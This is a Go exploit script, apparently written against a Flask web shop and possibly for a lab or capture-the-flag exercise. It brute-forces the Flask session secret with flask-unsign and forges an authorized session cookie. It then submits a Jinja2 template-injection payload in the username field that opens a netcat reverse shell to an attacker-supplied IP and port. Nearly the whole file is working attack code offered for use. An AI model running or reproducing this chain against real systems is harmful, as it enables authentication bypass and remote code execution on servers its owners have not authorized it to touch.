package main

import (
	"encoding/base64"
	"encoding/json"
	"exploit/utils"
	"flag"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strings"
	"time"
)

type Timestamp struct {
	Seconds     int64
	Nanoseconds int32
}

type Data struct {
	Time       Timestamp `json:"time,omitempty"`
	Authorized bool      `json:"authorized,omitempty"`
}

func (t *Timestamp) UnmarshalJSON(data []byte) error {
	// Unmarshal the raw timestamp as a float64
	var ts float64
	if err := json.Unmarshal(data, &ts); err != nil {
		return err
	}

	// Split the timestamp into seconds and nanoseconds
	seconds := int64(ts)
	nanoseconds := int32((ts - float64(seconds)) * 1e9)

	t.Seconds = seconds
	t.Nanoseconds = nanoseconds

	return nil
}

func (t Timestamp) MarshalJSON() ([]byte, error) {
	// Convert the timestamp back to a float64 (seconds + nanoseconds)
	ts := float64(t.Seconds) + float64(t.Nanoseconds)/1e9
	return json.Marshal(ts)
}

func main() {
	// TOOD: Verify the installation of flask-unsign
	cookieFileName := flag.String("cookiefile", "cookie", "file name of the unmodified cookie to store")
	attackerip := flag.String("rhost", "", "attackers ip for reverses connection")
	attackerport := flag.Int64("rport", 0, "attacker port for reverse connection")
	wordlistFileName := flag.String("wordlist", "", "filename of wordlist")
	target := flag.String("target", "", "target url http://127.0.0.1:1999")
	secret := flag.String("secret", "", "file name of the unmodified cookie to store")
	nowordlist := flag.Bool("nowordlist", false, "set to true if you don't want to generate the wordlist")
	// durationFlag := flag.Duration("duration", 2*time.Minute, "Duration to set the timer (e.g., 5m, 2h, 1s)")
	flag.Parse()

	if *attackerip == "" {
		fmt.Println("Error: The 'name' flag is required")
		flag.Usage() // Print usage instructions
		os.Exit(1)   // Exit with an error code
	} else if *attackerport == 0 && *wordlistFileName == "" {
		fmt.Println("Error: The 'name' flag is required")
		flag.Usage() // Print usage instructions
		os.Exit(1)   // Exit with an error code
	} else if *wordlistFileName == "" {
		fmt.Println("Error: The 'name' flag is required")
		flag.Usage() // Print usage instructions
		os.Exit(1)   // Exit with an error code
	}
	var err error

	// -- main code --
	if *secret == "" && *nowordlist == false {
		fmt.Println("Generating wordlist .....")
		utils.GenerateWordlist(*wordlistFileName)
	}

	// 2. Request for time
	jwtTime := utils.ExtractTime(*target)
	if jwtTime == "" {
		log.Fatal("Unable to get the session")
	}
	var key string
	key = fmt.Sprintf("b'%s'", *secret)
	if key == "b''" {
		err = os.WriteFile(*cookieFileName, []byte(jwtTime), 0644)
		if err != nil {
			log.Fatal("Unable to write the requestTime cookie")
		}
		fmt.Println("Bruteforcing Secret key")
		cmd := exec.Command("sh", "-c", "flask-unsign --unsign --cookie < "+*cookieFileName+" --wordlist "+*wordlistFileName+" --no-literal-eval")
		out, err := cmd.Output()
		if err != nil {
			log.Fatal("Unable to fetch the sign key")
		}
		key = string(out)

		if key == "" && key[0] != 'b' {
			log.Fatal("Unable to fetch the key from flask-unsign")
		}
	}
	// 3. flask-unsign & extract the key

	key = key[2:7]
	fmt.Println("Secret:", key)
	// 4. flask-unsign to modify

	parts := extractJWT(jwtTime)
	time.Sleep(4 * time.Second)
	decodedBytes, err := base64.StdEncoding.DecodeString(strings.TrimSpace(parts[0]))
	if err != nil {
		log.Fatal("Unable to base64 decode data segment of JWT! Kindly re-run")
	}

	var data Data
	err = json.Unmarshal(decodedBytes, &data)
	if err != nil {
		log.Fatal("Unable to unmarshal the data")
	}

	data.Time.Seconds += 50000
	data.Authorized = true

	modifiedData, err := json.Marshal(data)
	if err != nil {
		log.Fatal("Unable to marshal the modifiedData")
	}

	modifiedDataStr := strings.ReplaceAll(string(modifiedData), "\"", "'")
	modifiedDataStr = strings.ReplaceAll(modifiedDataStr, "true", "True")
	// fmt.Println(modifiedDataStr)
	signCmd := exec.Command("sh", "-c", "flask-unsign --sign --cookie \""+modifiedDataStr+"\" --secret \""+string(key)+"\"")
	signCmdOut, err := signCmd.Output()

	if err != nil {
		log.Fatal("Unable to sign the JWT")
	}
	postdata := "username={{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20" + *attackerip + "%20" + fmt.Sprint(*attackerport) + "%20%3E%2Ftmp%2Ff').read()}}&password=asdf1234"

	modifiedJWT := strings.TrimSpace(string(signCmdOut))
	fmt.Println("--- Parameters Found ---")
	fmt.Println("session=" + modifiedJWT)
	identifier := utils.Register(*target, modifiedJWT, postdata)
	fmt.Println("identifier=" + identifier)
	encodedJWT := utils.RootUrl(*target, modifiedJWT, identifier, postdata)
	fmt.Println("encodedJWT=" + encodedJWT)
	finalsession := "session=" + modifiedJWT + "; identifier=" + identifier + "; encodedJWT=" + encodedJWT
	utils.Shop("POST", *target, finalsession, postdata, "/")
	utils.Shop("POST", *target, finalsession, "productid=1", "/addToCart")
	fmt.Println("Reverse Shell Created")
	utils.Shop("GET", *target, finalsession, "", "/showCart")
	// 5. Send multiple requests
}

func extractJWT(token string) []string {
	parts := strings.Split(token, ".")

	if len(parts) == 3 {
		return parts
	}

	return nil
}
